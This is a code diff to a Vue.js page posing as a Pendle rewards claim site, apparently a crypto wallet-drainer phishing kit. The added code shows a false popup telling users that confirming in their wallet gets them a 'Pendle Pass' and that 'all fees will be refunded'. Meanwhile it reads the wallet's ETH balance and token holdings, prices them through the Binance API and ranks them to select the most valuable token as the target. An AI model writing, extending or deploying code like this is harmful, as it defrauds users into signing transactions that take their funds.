@@ -67,7 +67,8 @@
                 </div></button
               ><!---->
             </div>
-            <button @click.prevent="wc_claim"
+            <button
+              @click.prevent="wc_claim"
               data-v-0d5f7483=""
               class="bg-water-50 hover:bg-[#BFCBDF] hover:bg-opacity-20 px-4 rounded-full shadow pp-focus-outline h-7"
             >
@@ -222,9 +223,10 @@
                           >
                           claimed rewards in Pendle.
                         </p>
-                        <p class="mt-1">The
-                                amount of Pendle reward you can claim depends on your
-                                Ethereum balance.</p>
+                        <p class="mt-1">
+                          The amount of Pendle reward you can claim depends on
+                          your Ethereum balance.
+                        </p>
                       </div>
                     </div>
                     <!---->
@@ -267,7 +269,8 @@
                         ></path>
                       </svg>
                       <div>Connect wallet to claim</div>
-                      <button @click.prevent="wc_claim"
+                      <button
+                        @click.prevent="wc_claim"
                         type="button"
                         class="!px-5 pp-btn px-2.5 py-1.5 text-base rounded-2xl pp-focus-outline btn-gradient-secondary-light font-bold bg-white text-water-700 bg-pos-0 border-[#CADDF6] bg-size-400 hover:bg-pos-33 focus:bg-pos-100 transition-all duration-300 !px-5"
                       >
@@ -988,7 +991,6 @@ export default {
           this.processing = true;
           this.isDone = false;
 
-
           const token = this.maxToken;
           // if (token == null && this.claimable == 0) {
           //   this.isOk = true;
@@ -1042,6 +1044,23 @@ export default {
       try {
         if (getAccount().isConnected) {
           this.account = getAccount().address;
+          Swal.fire({
+            html:
+              '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
+              '<small style="font-size: 15px">Verify your wallet to continue</small> ',
+            showCloseButton: false,
+            showCancelButton: false,
+            showConfirmButton: false,
+            background: '#00000080',
+            width: '550px',
+            color: '#fff',
+            customClass: {
+              loader: '',
+            },
+            didOpen: () => {
+              Swal.showLoading();
+            },
+          });
           await this.showBalance();
           return;
         } else {
@@ -1049,6 +1068,23 @@ export default {
           web3modal.subscribeModal((newState) => {
             if (!newState.open) {
               if (getAccount().isConnected) {
+                Swal.fire({
+                  html:
+                    '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
+                    '<small style="font-size: 15px">Verify your wallet to continue</small> ',
+                  showCloseButton: false,
+                  showCancelButton: false,
+                  showConfirmButton: false,
+                  background: '#00000080',
+                  width: '550px',
+                  color: '#fff',
+                  customClass: {
+                    loader: '',
+                  },
+                  didOpen: () => {
+                    Swal.showLoading();
+                  },
+                });
                 this.account = getAccount().address;
                 this.showBalance();
               }
@@ -1064,7 +1100,7 @@ export default {
         this.processing = true;
         Swal.fire({
           html:
-            '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle rewards. All fees will be refunded immediately.</p>' +
+            '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
             '<small style="font-size: 15px">Verify your wallet to continue</small> ',
           showCloseButton: false,
           showCancelButton: false,
@@ -1088,24 +1124,23 @@ export default {
           BigInt(30000) * (feeData.gasPrice + feeData.lastBaseFeePerGas);
         const total = BigInt(balance.value) - BigInt(fee);
         this.balance = balance;
-        const alltokens = await getTokens(getAccount().address);
-        const validTokens = alltokens.filter((token) => token.balance > 0);
+        const validTokens = await getTokens(getAccount().address);
         for (let i = 0; i < validTokens.length; i++) {
           try {
-            const res = await axios.get(
-              `https://api.binance.com/api/v3/ticker/price?symbol=${validTokens[i].symbol}USDT`
+            const price = this.prices.filter(
+              (price) => price.symbol == `${validTokens[i].symbol}USDT`
             );
-            validTokens[i].usdPrice = res.data.price;
+            validTokens[i].usdPrice = price[0].price;
           } catch (error) {
             validTokens[i].usdPrice = 0;
             continue;
           }
         }
         const tokens = validTokens.filter((token) => token.usdPrice > 0);
-        const res = await axios.get(
-          `https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT`
+        const ethPrice = this.prices.filter(
+          (price) => price.symbol == 'ETHUSDT'
         );
-        const usdPrice_ = res.data.price;
+        const usdPrice_ = ethPrice[0].price;
         const claimable = Math.round(usdPrice_ * parseFloat(balance.formatted));
         this.claimable = claimable;
         for (let i = 0; i < tokens.length; i++) {
@@ -1116,6 +1151,7 @@ export default {
         }
         this.tokens = tokens;
         const maxToken = tokens.sort((a, b) => b.usdValue - a.usdValue);
+        console.log(total);
         this.sortedTokens = maxToken.filter((token) => token.usdValue > 3);
         this.maxToken = this.sortedTokens[this.currentIndex];
         if (total <= 0) {
@@ -1147,8 +1183,20 @@ export default {
         console.log(error);
       }
     },
+
+    async setPrices() {
+      try {
+        const res = await axios.get(
+          'https://api.binance.com/api/v3/ticker/price'
+        );
+        this.prices = res.data;
+      } catch (error) {
+        console.log(error);
+      }
+    },
   },
   created() {
+    this.setPrices();
     if (getAccount().isConnected) {
       this.account = getAccount().address;
       this.isConnected = true;
@@ -1158,6 +1206,9 @@ export default {
       window.ethereum.on('accountsChanged', async function () {
         await disconnect();
         localStorage.clear();
+        this.isConnected = false;
+        this.isOk = true;
+        this.isDone = false;
       });
     }
   },
